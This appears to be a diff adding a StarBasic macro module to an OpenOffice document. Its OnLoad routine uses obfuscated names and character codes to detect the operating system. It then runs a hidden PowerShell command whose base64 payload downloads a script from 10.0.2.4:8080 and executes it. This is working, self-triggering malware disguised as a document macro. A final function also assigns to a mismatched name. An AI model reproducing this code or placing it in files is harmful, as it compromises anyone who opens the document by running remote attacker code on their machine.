@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  *****  BASIC  *****
+
+
+    Sub OnLoad
+      Dim jFHOtLiHZl as string
+
+      Dim hm2C08K1fi as string, gCPjqRDvHw as string, IbNalgddRK as string, w3Jq5TTOG2 as string, cCcke7k3YY as string, dPREo1MkD5 as string
+
+      hm2C08K1fi = &quot;wi&quot;
+      gCPjqRDvHw = Chr$(110)
+      IbNalgddRK = &quot;do&quot;
+      w3Jq5TTOG2 = Chr$(119)
+      cCcke7k3YY = Chr$(115)
+      dPREo1MkD5 = hm2C08K1fi + gCPjqRDvHw + IbNalgddRK + w3Jq5TTOG2 + cCcke7k3YY
+
+      dim ZLmgMk9nnT as string
+      ZLmgMk9nnT = Chr$(111) + Chr$(115) + Chr$(120)
+
+      dim d0rXns6W93 as string, a2Ml1Qi2d9h as string, EnATPZnlfa as string, owFECFhuNx as string
+      d0rXns6W93 = Chr$(108) + Chr$(105)
+      a2Ml1Qi2d9h = &quot;n&quot;
+      EnATPZnlfa = Chr$(117) + Chr$(120)
+      owFECFhuNx = d0rXns6W93 + a2Ml1Qi2d9h + EnATPZnlfa
+
+
+
+
+      jFHOtLiHZl = ouHYwyUkMg
+      If jFHOtLiHZl = dPREo1MkD5 OR jFHOtLiHZl = ZLmgMk9nnT OR jFHOtLiHZl = owFECFhuNx Then
+        FB0AmhPQAP
+      end If
+    End Sub
+
+    Sub FB0AmhPQAP
+      Shell(&quot;cmd.exe /C &quot;&quot;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADAALgAyAC4ANAA6ADgAMAA4ADAALwBhAGIALgBwAHMAMQAnACkA&quot;&quot;&quot;)
+    End Sub
+    
+    Function ouHYwyUkMg() as string
+      Dim QGovyM6ytP as string, PSNG9AeJuG as string, dVAJHgDbcV as string, UfKHw2KwKP as string, ijKFou5hvN as string, TAShWPgLa7 as string
+
+      QGovyM6ytP = Chr$(119) + Chr$(105)
+      PSNG9AeJuG = Chr$(110)
+      dVAJHgDbcV = &quot;do&quot;
+      UfKHw2KwKP = Chr$(119)
+      ijKFou5hvN = Chr$(115)
+      TAShWPgLa7 = QGovyM6ytP + PSNG9AeJuG + dVAJHgDbcV + UfKHw2KwKP + ijKFou5hvN
+
+      Dim z4c37SR3aA as string
+      z4c37SR3aA = Chr$(111) + Chr$(115) + Chr$(120)
+
+      dim hTjUzCOa39 as string, hiCOOW1TV0 as string, r2ZqwDHFnV1 as string, CGO7m357LE as string
+      hTjUzCOa39 = Chr$(108) + Chr$(105)
+      hiCOOW1TV0 = chr$(110)
+      r2ZqwDHFnV1 = Chr$(117) + Chr$(120)
+      CGO7m357LE = hTjUzCOa39 + hiCOOW1TV0 + r2ZqwDHFnV1
+
+
+
+      select case getGUIType
+        case 1:
+          ouHYwyUkMg = TAShWPgLa7
+        case 3:
+          ouHYwyUkMg = z4c37SR3aA
+        case 4:
+          ouHYwyUkMg = CGO7m357LE
+      end select
+    End Function
+
+    Function ZPE3arNcBJ() as string
+    Dim jM9O1rwgsK as string, v5RJXLvBAv as string, CgkplbgD5f as string, EI2H5B9yf9 as string, Xk8SsFRo5a as string, rdvHMB9kps as string
+
+      jM9O1rwgsK = &quot;w&quot;
+      v5RJXLvBAv = Chr$(105) + Chr$(110)
+      CgkplbgD5f = &quot;d&quot;
+      EI2H5B9yf9 = Chr$(111)
+      Xk8SsFRo5a = Chr$(119) + Chr$(115)
+      rdvHMB9kps = jM9O1rwgsK + v5RJXLvBAv + CgkplbgD5f + EI2H5B9yf9 + Xk8SsFRo5a
+
+      Dim ucm7QxwaiT as string
+      ucm7QxwaiT = Chr$(101) + Chr$(120) + Chr$(101)
+
+      Dim h0dIOJKHYP as string
+      h0dIOJKHYP = Chr$(98) + Chr$(105) + Chr$(110)
+      select case ouHYwyUkMg
+        case rdvHMB9kps
+          GetFileName = ucm7QxwaiT
+        case else
+          GetFileName = h0dIOJKHYP
+      end select
+    End Function
+
+</script:module>
